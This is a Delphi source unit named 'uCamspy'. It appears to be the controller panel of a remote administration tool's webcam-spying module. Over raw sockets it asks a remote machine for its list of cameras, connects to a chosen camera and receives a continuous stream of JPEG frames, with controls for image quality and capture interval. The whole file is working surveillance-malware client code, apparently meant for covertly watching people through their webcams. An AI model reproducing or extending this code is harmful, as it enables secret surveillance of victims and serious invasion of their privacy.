unit uCamspy;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons,  ExtCtrls,winsock,jpeg, Grids;

type
  TForm7 = class(TForm)
    stat1: TStatusBar;
    pb1: TProgressBar;
    img1: TImage;
    TrackBar1: TTrackBar;
    lbl1: TLabel;
    cbb1: TComboBox;
    PngBitBtn1: TBitBtn;
    PngBitBtn2: TBitBtn;
    PngBitBtn3: TBitBtn;
    Label1: TLabel;
    UpDown1: TUpDown;
    Label2: TLabel;

    procedure PngBitBtn1Click(Sender: TObject);
    procedure PngBitBtn3Click(Sender: TObject);
    procedure PngBitBtn2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure UpDown1Click(Sender: TObject; Button: TUDBtnType);
  private
    { Private declarations }
  public
    sStop:boolean;
    sPause:boolean;
    procedure ProcessData;
    { Public declarations }
  end;

var
  Form7: TForm7;
    sRatio:extended;
    sSRation:integer;
    sWidth:integer;
    sHeight:integer;
    sForm:TObject;
implementation

{$R *.dfm}
Function Explode(sDelimiter: String; sSource: String): TStringList;
Var
  c: Word;
Begin
  Result := TStringList.Create;
  C := 0;

  While sSource <> '' Do
  Begin
    If Pos(sDelimiter, sSource) > 0 Then
    Begin
      Result.Add(Copy(sSource, 1, Pos(sDelimiter, sSource) - 1 ));
      Delete(sSource, 1, Length(Result[c]) + Length(sDelimiter));
    End
    Else
    Begin
      Result.Add(sSource);
      sSource := ''
    End;

    Inc(c);
  End;
End;
procedure TForm7.ProcessData;
var
  Len:integer;
  Buffer: Array[0..1000] Of Char;
  rFile:Array[0..8000] Of Char;
  Data,t:string;
  myTempStream:Tmemorystream;
  Transferedsize,Bytessize,mysize,total,derr:integer;
  sJPG:TJpegimage;
  sStrList:tstringlist;
  i:integer;
label
  lol;
begin
myTempstream := Tmemorystream.Create;
sJPG := tjpegimage.Create;
Repeat
  Len := Recv(StrToInt(Stat1.Panels[2].Text),Buffer, SizeOf(Buffer), 0);
  If (Len <= 0) Then Break;
  Data := String(Buffer);
  ZeroMemory(@Buffer, SizeOf(Buffer));
    if (Copy(data,1,3) = '102') then begin
        mytempstream.Clear;
       delete(data,1,3);
       mysize := strtoint(copy(data,1,pos('|',data) - 1));
       pb1.Position := 0;
       pb1.Max := mysize;
       stat1.Panels.Items[3].Text := 'Size: ' + inttostr(mysize) + ' Bytes';
       TransferedSize := 0;
        BytesSize := 0;
        T := 'ok';
        if mysize < 100 then begin
        spause := true;
        messagebox(form7.Handle,Pchar('Error!'),Pchar('ERROR!'),0);
        break;
        end;
        If (BytesSize < mysize) Then
        Begin
          Total := 1;
          Repeat
            FillChar(rFile, SizeOf(rFile), 0);
            dErr := Recv(StrToInt(Stat1.Panels[2].Text), rFile, SizeOf(rFile), 0);
            If dErr = -1 Then goto lol;
            if mysize < (derr + total) then begin
              MyTempStream.Write(rFile,mysize - total + 1);
              Inc(Total, derr);
            end else begin
              Inc(Total, dErr);
              MyTempStream.Write(rFile,dErr);
            end;
            pb1.Position := total;
            TransferedSize := Total;
          Until (Total >= mySize);
       end;
       mytempstream.Position := 0;
       try
       sjpg.LoadFromStream(mytempstream);
       img1.Picture.Assign(sjpg);
       except
       end;
       lol:
        sleep(200);
        sleep(updown1.Position * 1000);
         T := 'SEND' + IntToStr(TrackBar1.Position);
         Send(StrToInt(Stat1.Panels[2].Text), t[1], length(t), 0);
    end;
    if (Copy(data,1,3) = '101') then begin
      sStrlist := tstringlist.Create;
      sstrlist := explode('|',data);
      cbb1.Clear;
      for i := 1 to sstrlist.Count -1 do begin
         cbb1.AddItem(sstrlist.Strings[i],nil);
      end;
      pngbitbtn1.Enabled := true;
      pngbitbtn2.Enabled := false;
      img1.Enabled := true;
      pb1.Enabled := true;
      Label1.Enabled := true;
      Label2.Enabled := true;
      TrackBar1.Enabled := true;
      lbl1.Enabled := true;
      cbb1.Enabled := true;
      updown1.Enabled := true;
    end;
    if (Copy(data,1,3) = '103') then begin
        pngbitbtn1.Enabled := false;
        pngbitbtn3.Enabled := false;
        pngbitbtn2.Enabled := true;
        img1.Enabled := false;
        pb1.Enabled := false;
        Label1.Enabled := false;
        Label2.Enabled := false;
        TrackBar1.Enabled := false;
        lbl1.Enabled := false;
        cbb1.Enabled := false;
        updown1.Enabled := false;
       T := 'SEND' + IntToStr(TrackBar1.Position);
       Send(StrToInt(Stat1.Panels[2].Text), t[1], length(t), 0);
    end;
    if (Copy(data,1,3) = '104') then begin
    end;
until 1=2;
Stat1.Panels[2].Text := '0';
myTempstream.Free;
sjpg.Free;
end;
procedure TForm7.PngBitBtn1Click(Sender: TObject);
var
sock:tSocket;
Data:string;
begin
if (cbb1.Text <> '') and (copy(cbb1.text,1,1) = '<') then begin
  spause := false;
  if Stat1.Panels[2].Text = '0' then begin
     Data := '29|' + Stat1.Panels[0].Text + #10;
     Sock := StrToInt(Stat1.Panels[0].Text);
     Send(Sock, Data[1], Length(Data), 0);
     img1.Enabled := false;
     pb1.Enabled := false;
     Label1.Enabled := false;
     Label2.Enabled := false;;
     TrackBar1.Enabled := false;
     lbl1.Enabled := false;
     cbb1.Enabled := false;
     PngBitBtn3.Enabled := false;
     pngbitbtn1.enabled := false;
     updown1.Enabled := false;
     pngbitbtn2.enabled := false;
     exit;
  end;
  Data := 'CONN' + copy(cbb1.text,2,pos('>',cbb1.Text) - 1);
  Sock := StrToInt(Stat1.Panels[2].Text);
  Send(Sock, Data[1], Length(Data), 0);
end;
end;

procedure TForm7.PngBitBtn3Click(Sender: TObject);
var
  sock:integer;
  data:string;
begin
  if Stat1.Panels[2].Text = '0' then begin
     Data := '29|' + Stat1.Panels[0].Text + #10;
     Sock := StrToInt(Stat1.Panels[0].Text);
     Send(Sock, Data[1], Length(Data), 0);
     img1.Enabled := false;
     pb1.Enabled := false;
     Label1.Enabled := false;
     Label2.Enabled := false;
     TrackBar1.Enabled := false;
     updown1.Enabled := false;
     lbl1.Enabled := false;
     cbb1.Enabled := false;
     PngBitBtn3.Enabled := false;
     pngbitbtn1.enabled := false;
     pngbitbtn2.enabled := false;
     exit;
  end;
Data := 'LIST';
Sock := StrToInt(Stat1.Panels[2].Text);
Send(Sock, Data[1], Length(Data), 0);
end;

procedure TForm7.PngBitBtn2Click(Sender: TObject);
var
sock:tSocket;
Data:string;
begin
img1.Enabled := true;
pb1.Enabled := true;
Label1.Enabled := true;
Label2.Enabled := true;
TrackBar1.Enabled := true;
lbl1.Enabled := true;
cbb1.Enabled := true;
PngBitBtn3.Enabled := true;
pngbitbtn2.enabled := false;
pngbitbtn1.Enabled := true;
updown1.Enabled := true;
closesocket(StrToInt(Stat1.Panels[2].Text));
end;

procedure TForm7.FormClose(Sender: TObject; var Action: TCloseAction);
begin
PngBitBtn2.Click;
end;

procedure TForm7.UpDown1Click(Sender: TObject; Button: TUDBtnType);
begin
label2.Caption := inttostr(updown1.Position);
end;

end.
